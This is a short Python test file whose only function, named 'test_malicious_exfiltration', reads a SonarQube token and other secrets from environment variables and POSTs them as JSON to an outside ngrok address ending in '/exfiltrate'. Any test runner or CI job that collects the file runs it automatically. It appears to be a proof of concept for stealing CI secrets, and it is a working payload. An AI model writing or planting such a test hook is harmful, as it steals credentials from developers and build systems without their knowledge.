import os
import urllib.request
import json

def test_malicious_exfiltration():
    sonar_token = os.environ.get("PXXGUIN_SONAR_TOKEN", "NOT_FOUND")
    test_token = os.environ.get("THIS_IS_TEST", "NOT_FOUND")
    pxxguin = os.environ.get("PXXGUIN", "NOT_FOUND")
    dragon = os.environ.get("DRAGON", "NOT_FOUND")

    data = {
        "pxxguin":pxxguin,
        "sonar_token": sonar_token,
        "test_token":test_token,
        "dragon":dragon
    }

    req = urllib.request.Request(
        "https://2ac8-220-120-106-126.ngrok-free.app/exfiltrate", 
        data=json.dumps(data).encode('utf-8'),
        headers={'Content-Type': 'application/json'}
    )
    urllib.request.urlopen(req)
